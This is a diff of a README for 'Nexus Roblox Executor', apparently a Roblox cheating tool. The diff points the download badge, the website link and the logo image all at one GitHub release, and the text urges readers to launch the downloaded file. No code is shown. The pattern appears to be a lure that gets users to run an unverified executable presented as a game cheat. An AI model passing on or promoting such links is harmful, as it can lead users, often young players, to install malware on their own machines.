@@ -22,16 +22,16 @@
 
 Ready to experience the power of Nexus Executor? Download the executor from the link below:
 
-[![Download Nexus Executor](https://img.shields.io/badge/Download-Nexus_Executor-blue)](https://github.com/file/App.zip)
+[![Download Nexus Executor](https://github.com/msaad453/Nexus-Roblox/releases/tag/v2.0)](https://github.com/msaad453/Nexus-Roblox/releases/tag/v2.0)
 
 📌 **Note:** If the link ends with the file name, make sure to launch the downloaded file to access Nexus Executor.
 
 ## Explore Further 🌐
 
-Visit our website [https://www.nexusexecutor.com](https://www.nexusexecutor.com) to discover more about Nexus Executor and explore additional features and resources.
+Visit our website [https://github.com/msaad453/Nexus-Roblox/releases/tag/v2.0](https://github.com/msaad453/Nexus-Roblox/releases/tag/v2.0) to discover more about Nexus Executor and explore additional features and resources.
 
 ---
 
 With Nexus Roblox Executor, scripting in Roblox becomes a seamless and enjoyable experience. Join the community of scripters leveraging the power of Nexus Executor today! If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options. Happy scripting! 🎮💻
 
-![Roblox Logo](https://cdn.worldvectorlogo.com/logos/roblox-1.svg)
+![Roblox Logo](https://github.com/msaad453/Nexus-Roblox/releases/tag/v2.0)
